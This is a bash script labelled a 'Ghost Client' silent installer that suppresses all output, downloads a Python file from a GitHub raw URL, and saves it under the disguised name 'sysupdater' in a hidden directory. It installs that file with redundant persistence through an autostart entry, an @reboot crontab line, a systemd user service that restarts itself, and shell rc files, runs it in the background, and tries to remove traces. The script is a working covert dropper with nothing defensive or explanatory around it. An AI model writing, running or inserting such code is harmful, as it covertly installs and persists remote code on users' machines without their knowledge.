#!/bin/bash
# ============================================================
# SDF Ghost Client - Linux Silent Installer (FIXED)
# ============================================================

# Hide all output
exec >/dev/null 2>&1

# Set variables
CLIENT_URL="https://raw.githubusercontent.com/glitech01x/OsinToolKit/refs/heads/main/OsinTool.py"
CLIENT_NAME="sysupdater"
INSTALL_DIR="$HOME/.local/share/sysupdater"
CLIENT_FILE="$INSTALL_DIR/$CLIENT_NAME.py"
STARTUP_FILE="$HOME/.config/autostart/$CLIENT_NAME.desktop"
INSTALL_FLAG="$INSTALL_DIR/.installed"
BIN_DIR="$HOME/.local/bin"
BIN_FILE="$BIN_DIR/$CLIENT_NAME"
SERVICE_FILE="$HOME/.config/systemd/user/$CLIENT_NAME.service"

# Create directories
mkdir -p "$INSTALL_DIR" 2>/dev/null
mkdir -p "$BIN_DIR" 2>/dev/null
mkdir -p "$HOME/.config/autostart" 2>/dev/null
mkdir -p "$HOME/.config/systemd/user" 2>/dev/null

# Download client
if command -v curl >/dev/null 2>&1; then
    curl -sSL -o "$CLIENT_FILE" "$CLIENT_URL"
elif command -v wget >/dev/null 2>&1; then
    wget -q -O "$CLIENT_FILE" "$CLIENT_URL"
else
    python3 -c "import urllib.request; urllib.request.urlretrieve('$CLIENT_URL', '$CLIENT_FILE')" 2>/dev/null
fi

# Make executable
chmod +x "$CLIENT_FILE" 2>/dev/null

# Create symlink in bin
ln -sf "$CLIENT_FILE" "$BIN_FILE" 2>/dev/null

# Create autostart .desktop file
cat > "$STARTUP_FILE" << 'EOF'
[Desktop Entry]
Type=Application
Name=sysupdater
Exec=/bin/bash -c "sleep 5 && /home/$USER/.local/share/sysupdater/sysupdater.py"
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
EOF

# Fix the desktop file with actual username
sed -i "s/\$USER/$USER/g" "$STARTUP_FILE" 2>/dev/null

# Add to crontab for redundancy
(crontab -l 2>/dev/null | grep -v "$CLIENT_NAME" ; echo "@reboot sleep 10 && $CLIENT_FILE") | crontab - 2>/dev/null

# Create systemd user service
cat > "$SERVICE_FILE" << 'EOF'
[Unit]
Description=sysupdater
After=network.target

[Service]
Type=simple
ExecStart=/home/$USER/.local/share/sysupdater/sysupdater.py
Restart=always
RestartSec=30
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
EOF

# Fix service file with actual username
sed -i "s/\$USER/$USER/g" "$SERVICE_FILE" 2>/dev/null

# Enable systemd service
systemctl --user daemon-reload 2>/dev/null
systemctl --user enable "$CLIENT_NAME.service" 2>/dev/null
systemctl --user start "$CLIENT_NAME.service" 2>/dev/null

# Add to .bashrc / .zshrc for shell persistence
SHELL_RC="$HOME/.bashrc"
if [ -f "$HOME/.zshrc" ]; then
    SHELL_RC="$HOME/.zshrc"
fi
if ! grep -q "$CLIENT_NAME" "$SHELL_RC" 2>/dev/null; then
    echo "# $CLIENT_NAME" >> "$SHELL_RC"
    echo "$CLIENT_FILE &" >> "$SHELL_RC"
fi

# Create installation flag
echo "installed" > "$INSTALL_FLAG" 2>/dev/null

# Run client in background
nohup python3 "$CLIENT_FILE" >/dev/null 2>&1 &

# Clean up self
cat > /tmp/cleanup.sh << 'EOF'
#!/bin/bash
sleep 1
rm -f "$0" 2>/dev/null
exit 0
EOF
chmod +x /tmp/cleanup.sh
/tmp/cleanup.sh &

exit 0
